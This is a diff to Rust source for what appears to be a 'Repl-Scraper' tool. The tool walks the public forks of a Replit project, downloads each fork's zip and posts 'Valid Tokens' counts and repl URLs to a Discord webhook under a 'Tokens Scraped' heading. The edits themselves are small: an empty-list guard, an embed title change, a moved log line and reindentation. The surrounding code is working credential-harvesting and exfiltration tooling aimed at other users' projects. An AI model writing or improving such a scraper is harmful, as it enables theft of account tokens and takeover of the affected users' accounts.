@@ -95,6 +95,9 @@ impl Webhook {
     }
 
     pub async fn send(&self, repl_url: &str, token_type: &str, tokens: Vec<String>) {
+        if tokens.is_empty() {
+            return
+        }
         let client = Client::new();
         let start = format!("```fix\nValid Tokens: {}\nURL: {}```", tokens.len(), repl_url);
         let mut da_str = "".to_owned();
@@ -105,11 +108,7 @@ impl Webhook {
                 let json = json!({
                     "embeds": [
                         {
-                            "author": {
-                                "name": format!("{} Tokens Scraped", token_type),
-                                "url": "https://github.com/Shell1010/Repl-Scraper",
-                                "avatar_url": "https://cdn.discordapp.com/attachments/1041468395822006324/1041505288588623922/other_omega.png",
-                            },
+                            "title": format!("{} Tokens Scraped", token_type),
                             "fields": [
                                 {
                                     "name": "\u{200b}",
@@ -148,11 +147,7 @@ impl Webhook {
             let json = json!({
                 "embeds": [
                     {
-                        "author": {
-                            "name": format!("{} Tokens Scraped", token_type),
-                            "url": "https://github.com/Shell1010/Repl-Scraper",
-                            "avatar_url": "https://cdn.discordapp.com/attachments/1041468395822006324/1041505288588623922/other_omega.png",
-                        },
+                        "title": format!("{} Tokens Scraped", token_type),
                         "fields": [
                             {
                                 "name": "\u{200b}",
@@ -293,7 +288,7 @@ impl Replit {
                 .send().await.unwrap();
                 let repl = resp.json::<StartFork>().await.unwrap().start.data.repl;
 
-                println!("\x1b[0;92m{} forks loaded...\x1b[0m", urls.len());
+
                 let forks = repl.publicForks.items;
 
                 if !forks.is_empty() {
@@ -301,6 +296,7 @@ impl Replit {
                         urls.push(fork.url);
                         ids.push(fork.id);
                     }
+                println!("\x1b[0;92m{} forks loaded...\x1b[0m", urls.len());
                 } else {
                     break;
                 }
@@ -339,27 +335,27 @@ impl Replit {
             match resp {
                 Ok(resp) => {
                     if resp.status().is_success() {
-                        match resp.bytes().await {
-                            Ok(bytes) => {
-                                src = bytes.to_vec();
-                                println!("\x1b[0;92mFinished downloading fork {}...\x1b[0m", &count);
-                                return Some(src)
-                            } Err(e) => {
-                                println!("\x1b[0;91mError: {e}\x1b[0m");
-                                return None
-                            }
+                    match resp.bytes().await {
+                        Ok(bytes) => {
+                            src = bytes.to_vec();
+                            println!("\x1b[0;92mFinished downloading fork {}...\x1b[0m", &count);
+                            return Some(src)
+                        } Err(e) => {
+                            println!("\x1b[0;91mError: {e}\x1b[0m");
+                            return None
                         }
+                    }
                     } else if resp.status().as_str() == "429" {
-                        match resp.headers().get("retry-after") {
-                            Some(retry) => {
-                                println!("\x1b[0;91mRatelimited... Waiting for {} seconds\x1b[0m", retry.to_str().unwrap());
-                                sleep(Duration::from_secs(retry.to_str().unwrap().to_string().parse::<u64>().unwrap())).await;
-                            },
-                            None => return None,
-                        }
+                    match resp.headers().get("retry-after") {
+                        Some(retry) => {
+                            println!("\x1b[0;91mRatelimited... Waiting for {} seconds\x1b[0m", retry.to_str().unwrap());
+                            sleep(Duration::from_secs(retry.to_str().unwrap().to_string().parse::<u64>().unwrap())).await;
+                        },
+                        None => return None,
+                    }
                     } else {
-                        println!("\x1b[0;91mFailed to retrieve zip. Error: {}\x1b[0m", resp.status().as_str());
-                        return None
+                    println!("\x1b[0;91mFailed to retrieve zip. Error: {}\x1b[0m", resp.status().as_str());
+                    return None
                     }
                 },
                 Err(_) => continue,
